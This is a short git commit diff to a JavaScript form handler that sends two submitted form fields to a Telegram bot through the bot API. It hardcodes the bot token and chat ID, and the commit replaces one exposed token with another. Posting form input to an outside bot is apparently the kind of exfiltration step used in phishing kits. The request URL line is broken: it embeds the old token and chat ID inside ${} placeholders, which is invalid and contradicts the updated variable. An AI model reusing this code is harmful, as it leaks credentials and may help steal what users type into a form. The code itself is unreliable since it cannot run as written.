f22c9d0c588c9a29b582f7cc67957517419f8aad
jacksparox13 <jacksparox13@gmail.com>
2024-07-21 16:05:05 +0200

    Update form.js

--- form.js
+++ form.js
@@ -8,7 +8,7 @@ form.addEventListener("submit", (e) => {
 
     var my_text = `Result is: %0A - Text1: ${text1} %0A - Text2: ${text2}`;
 
-    var token = "7297044544:AAGNcG6EbkSqDCs93qRm2zaCJHcZi2yb_jc";
+    var token = "6927456490:AAFanv0L0LyPB8swrDqJ-v71DHh6eTSeBIA";
     var chat_id = -7222383115;
     var url = `https://api.telegram.org/bot${7297044544:AAGNcG6EbkSqDCs93qRm2zaCJHcZi2yb_jc}/sendMessage?chat_id=${7222383115}&text=${my_text}`;
 
